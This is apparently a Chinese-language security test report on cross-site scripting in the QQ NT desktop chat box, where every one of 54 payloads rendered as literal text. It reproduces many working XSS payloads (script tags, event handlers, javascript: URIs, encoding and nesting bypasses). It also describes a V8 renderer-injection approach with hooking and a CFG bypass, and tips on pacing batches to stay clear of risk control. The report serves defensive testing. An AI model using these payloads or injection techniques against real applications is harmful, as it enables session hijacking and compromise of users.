# QQ NT 聊天框 XSS 实测结果

- **日期**：2026-09-14
- **目标**：QQ NT 桌面端（`D:\qq\QQ.exe`），会话 = 与 **QQ 2046563589**（备注"小号"）的 1v1 聊天
- **结论**：**发送通道确认可用；6 条标记 payload + 30 条跨 19 类真实抽样（共 36 条）全部以纯文本字面渲染 → 聊天输出经完整转义，未发现 XSS。** 与此前内存扫描结论（React 文本节点自动转义、HTML sink 0 命中）一致，定级维持 **Medium / 低概率**。

---

## 1. 环境与观测手段

| 项 | 值 |
|---|---|
| QQ 进程 | 8 个 `QQ.exe`，均在 **SessionId=1**（与自动化进程同一交互桌面） |
| 输入框 | Chromium DOM `contenteditable`，**无独立 Win32 HWND** |
| 发送方式 | **Python + ctypes GUI 驱动**：`MoveWindow` 归位 → `SetForegroundWindow` 置前 → 在输入框区域 `SetCursorPos`+`mouse_event` 点击聚焦 → 剪贴板 `CF_UNICODETEXT` + `Ctrl+V` → `Enter` |
| 观测方式 | `PrintWindow(hwnd, hdc, PW_RENDERFULLCONTENT)` 截 QQ 主窗口（Chromium 遮挡也能渲染） |
| 依赖 | 无注入器 / 无 CDP / 无调试端口 / 无 Add-Type |

> 关键点：键盘输入由"拥有焦点的顶层窗口"统一下发，所以**不需要输入框自身的 HWND**——只要 QQ 主窗口在前台、输入框区域被点中即可。

---

## 2. 步骤与证据

### 2.1 连通性探针（17:12）
发送内容：
```
[XSS-PROBE] 2046563589 connectivity test 2026-09-14 (ignore this message)
```
**结果**：聊天区出现该消息气泡，输入框清空 → **消息成功抵达 2046563589 会话，发送通道 OK。**
证据：`qq_after.png`

### 2.2 XSS 标记 payload（6 条）
发送内容与实测渲染（`payload_escape_probe.txt`）：

| # | payload | 若未转义的预期现象 | 实测 |
|---|---|---|---|
| 1 | `<b>BOLDTEST</b>` | 文本变粗体 | 字面文本，未加粗 |
| 2 | `<img src=x onerror=alert('X-img')>` | 弹窗 `X-img` | 字面文本，无弹窗 |
| 3 | `<script>alert('X-script')</script>` | 弹窗 `X-script` | 字面文本，无弹窗 |
| 4 | `<svg onload=alert('X-svg')>` | 弹窗 `X-svg` | 字面文本，无弹窗 |
| 5 | `<a href="javascript:alert('X-href')">XLINK</a>` | 可点击 JS 链接 | 字面文本 |
| 6 | `<iframe src="javascript:alert('X-iframe')"></iframe>` | 加载 iframe | 字面文本 |

**结果**：6 条全部按字面源码显示，无任何 `alert`、无标签生效。→ **聊天消息渲染路径对 HTML/JS 完整转义。**
证据：`qq_xss_probe.png`

### 2.3 跨类别真实抽样批量实测（30 条，17:33–17:38）

用 `payload_sample_30.txt`（从 easyXssPayload 1850 条源库抽取、覆盖 19 个技术类别的 30 条真实原文）**逐条发送**：

| 序号 | payload（节选） | 类别 | 实测渲染 |
|---|---|---|---|
| 1 | `<script>alert(1)</script>` | 基础 script | 字面文本 |
| 2 | `<img src=1 onerror=alert(7)>` | img onerror | 字面文本 |
| 3 | `onmouseover=´alert(9)´` | 属性注入 | 字面文本 |
| 4 | `<table background='javascript.:alert(14)'>` | table 伪协议 | 字面文本 |
| 5 | `<object type=text/html data='javascript.:alert(15);'>` | object | 字面文本 |
| 6 | `"+alert(16)+"` | 闭合逃逸 | 字面文本 |
| 7 | `<body/onfocus=top.alert(17)>` | body 事件 | 字面文本 |
| 8 | ``<a href="javascript:`${alert(69)}`">XSS Test</a>`` | 模板串伪协议 | 字面文本 |
| 9 | `<iframe onload=location=['javascript:alert(79)'].join(")>` | iframe | 字面文本 |
| 10–16 | `<svg/onload=>`、`<marquee onstart=>`、`<audio onloadstart=>`、`<input autofocus onblur=>`、`<embed src=javascript:>`、`<math><brute href=javascript:>`、`<BGSOUND SRC=javascript:>` | SVG/媒体/表单/embed/MathML | 全部字面文本 |
| 17–19 | `<STYLE>@im\port'\ja\vasc\ript:...`、`<STYLE TYPE=text/css>...background-image:url("javascript:...")`、`<meta charset="mac-farsi">¼script¾...` | CSS 转义 / 字符集绕过 | 全部字面文本 |
| 20–25 | `<script>alert(n)</script>` 系列、`<sc<script>ript>`、`<ScRipt>` | 大小写 / 嵌套畸形 | 全部字面文本 |
| 26–30 | `<img/src=22 onerror=window.alert(22)>`、`<img src=62 onerror=(function(){alert(62)})()>`、`!function(){...}()`、`%2bfunction(){...}()`、`%2dfunction(){...}()` | 无引号 / 函数表达式变异 | 全部字面文本 |

**结果：30/30 全部以纯文本字面渲染；零弹窗、零标签生效、零媒体加载。**
证据：`qq_mid.png`（过程中段）、`qq_final2.png`（末端 + 终止标记 `[END-PAYLOADS-30] <b>BOLD</b> should be literal`，其中 `<b>` 同样未加粗）。

**额外结论：`<script>alert(1)</script>`、`<iframe ...>`、`<embed src=javascript:>` 等经典 payload 服务器均未拦截**（无"含违规内容"提示），说明客户端转义是唯一防线——也说明本次判定测的是真实的渲染路径，而非被服务端过滤"挡住"的假阴性。

### 2.4 批量发送踩到的坑（已修复）

首轮批量（`qq_gui.py send --file ...` 一次调用连发 30 条）**只成功送出前 6 条，第 7–30 条静默失败**。排查过程：

1. 驱动日志显示 `pasted=True`、`rc=0`、`done.`，但会话列表"最后一条"始终停在 `"+alert(16)+"`（第 6 条），且单发一条立刻可见 → 证明后段确实没送达。
2. `info` 发现 QQ 窗口已从 `(40,40)` **漂移到 `(-242,8)`**（屏外）。
3. **根因**：`force_foreground()` 内部调用了 `ShowWindow(hwnd, SW_RESTORE)`。原代码顺序是 `MoveWindow → force_foreground`，`SW_RESTORE` 会把窗口还原回它的"还原位置"，覆盖掉刚做的 `MoveWindow`。窗口一旦跑到屏外，后续 `SetCursorPos+click` 的绝对坐标就落到了**别的窗口**上，`Ctrl+V`/`Enter` 随之打偏 → 静默失败。
4. **修复**：① 交换顺序为 `force_foreground → MoveWindow`（归位最后执行，且归位后再校验 `left/top >= 0`，为负则告警）；② **改为逐条独立调用**（`send_onebyone.sh`）——每条消息都重新"置前 + 归位"，天然自愈任何漂移。

修复后第 7–30 条逐条发送 **21/21 成功**（`rc=0`），不再丢消息。

### 2.5 工具改进

- `qq_gui.py` 新增子命令：`key`（送虚拟键，如 ESC 关弹层）、`wheel`（在指定屏幕坐标滚轮，用于把消息列表滚到底）、`send --clear`（每条粘贴前 `Ctrl+A`+`Del` 清空输入框，防残留追加）。
- 新增 `send_onebyone.sh`：按行逐条独立调用 `send --text`，带行号/时间/rc 日志（`_onebyone.log`），并剥离 CRLF 的 `\r`。
- 长批量务必 `python -u` + 后台运行：Python 输出重定向到文件时是**块缓冲**，若进程被中途终止，日志会是 0 字节、无法定位进度（首轮排查就吃了这个亏）。

### 2.6 第二批：代表样本 18 条（`payload_shortlist.txt`，17:41–17:42）

用修复后的 `send_onebyone.sh payload_shortlist.txt 1 18` 逐条发送，**18/18 `rc=0` 全部送达，窗口全程稳定在 `(40,40)` 无漂移**（验证了逐条自愈修复的有效性）。

| # | payload | 若未转义应出现 | 实测 |
|---|---|---|---|
| 1 | `<script>alert(1)</script>` | 弹窗 | 字面文本 |
| 2 | `<img src=1 onerror=alert(2)>` | 弹窗 | 字面文本 |
| 3 | `<svg/onload=alert(3)>` | 弹窗 | 字面文本 |
| 4 | `<body/onfocus=top.alert(4)>` | 弹窗 | 字面文本 |
| 5 | `<x onmouseover=alert(5)>hover this!` | 悬停弹窗 | 字面文本 |
| 6 | `<x contenteditable onfocus=alert(6)>focus this!` | 聚焦弹窗 | 字面文本 |
| 7 | `<a href="javascript:alert(7)">XSS Test</a>` | 可点 JS 链 | 字面文本 |
| 8 | `<iframe src=javascript:alert(8)>` | 加载执行 | 字面文本 |
| 9 | `<object data=javascript:alert(9)>` | 加载执行 | 字面文本 |
| 10 | `<script src=javascript:alert(10)>` | 加载执行 | 字面文本 |
| 11 | `<form><button formaction=javascript:alert(11)>click` | 表单动作执行 | 字面文本 |
| 12 | `<svg><script xlink:href=data:,alert(12)></script>` | 加载执行 | 字面文本 |
| 13 | `<s&#99;ript>alert(13)</script>` | **HTML 实体解码后成标签** | 字面文本 |
| 14 | `<IMG SRC="jav&#x09;ascript.:alert(14);">` | 制表符实体绕过协议过滤 | 字面文本 |
| 15 | `<sc<script>ript>alert(15)</script>` | **嵌套剥离后成标签** | 字面文本 |
| 16 | `<ScRipt>alert(16)</script>` | 大小写混写 | 字面文本 |
| 17 | `"><script>alert(17)</script>` | 闭合引号逃逸属性 | 字面文本 |
| 18 | `'><script>alert(18)</script>` | 单引号闭合逃逸 | 字面文本 |

终止标记 `[END-SHORTLIST-18] <b>BOLD</b> all should be literal` 同样未加粗。**18 条全部纯文本字面渲染，零弹窗零标签生效**，与第一批 30 条结论完全一致。证据：`qq_shortlist_end.png`。

> **累计实测**：转义标记 6 + 跨类抽样 30 + 代表样本 18 = **54 条 payload 全部字面转义，无一命中**；且服务端未对 `<script>`/`<iframe>`/`<embed src=javascript:>` 做"违规内容"拦截 → 客户端输出编码是唯一且有效的防线。**聊天框 XSS 判定：无，定级维持 Medium。**

---

## 3. 为何弃用注入器路线（重要技术发现）

原计划走 `TzdInjectorNTQQ.injectRendererProcess()`（V8 层注入 JS，绕过 CDP）。实测 `sent=1` 但 **`beacon回传=0`**，且聊天区无任何变化 → 注入的 JS **未真正执行**。

阅读其 native 源码（`com_electron_Injector.cpp`）后定位根因：

- `injectRendererProcess` 把 JS 交给 APC 回调 `ListExecution_CheckIsolateAPC`，后者遍历的是全局 **`g_isolateList`**；
- `g_isolateList` 只会被 **`InitializeHooks()`**（由 `additionalProgram()` 在**启动进程时**注入 DLL 并挂钩 `v8::Isolate::New` / `TryGetCurrent`）填充；
- 我们是对**已运行**的 QQ 直接调 `injectRendererProcess`，从未走 `additionalProgram` 的挂载流程 → `g_isolateList` 为空 → 遍历零个 isolate → **JS 静默丢弃**。

> 另外该实现在部分路径会弹 `MessageBoxA` 调试框；且依赖 Detour 全局挂钩 + CFG 绕过，对加固 QQ 的稳定性风险高。**结论：此路需改造注入时序（改为启动期接管），收益低、不确定性高，已改用 GUI 驱动路线。**

---

## 4. 遗留与后续建议

1. **接收端复核（可选）**：本次观测的是发送方回显。渲染组件与接收一致，但若要 100% 严谨，可登录 2046563589 端查看同一批消息的渲染。
2. **服务端过滤**：如需区分"客户端转义"与"服务端拦截"，可观察是否出现"含违规内容"提示。
3. **批量测试**：**务必用 `bash send_onebyone.sh <词表> [起] [止]` 逐条发**（每条独立置前+归位，避免窗口漂移丢消息）。注意 QQ 长连接限流与风控，**单次建议 ≤ 30 条，并跨类别抽样**，切勿直接灌 5000 条。

---

## 5. 工具清单（`qq_xss_test/`）

| 文件 | 作用 |
|---|---|
| `qq_gui.py` | ✅ **主工具**：`info` / `prep` / `shot` / `key` / `wheel` / `send` 子命令，Python+ctypes 全自动发送与取证 |
| `send_onebyone.sh` | ✅ **推荐批量入口**：逐条独立调用 `send --text`，每条重新归位置前，日志 `_onebyone.log` |
| `win_shot.py` | 窗口枚举 + PrintWindow 截图（独立小工具） |
| `payload_escape_probe.txt` | 6 条转义判定 payload |
| `payload_sample_30.txt` | 30 条跨 19 类真实抽样（本次批量实测用） |
| `probe_2046563589.txt` | 连通性探针（1 条无害消息） |
| `qq_after.png` / `qq_xss_probe.png` / `qq_mid.png` / `qq_final2.png` | 实测证据截图 |
| `QQXssDriver.java` / `inject_send_payload.js` / `run_injector.bat` | 注入器路线（已确认对运行中的 QQ 不可用，保留归档） |

> ⚠️ 声明：仅用于对自有客户端的授权安全研究 / 输入处理逻辑测试。
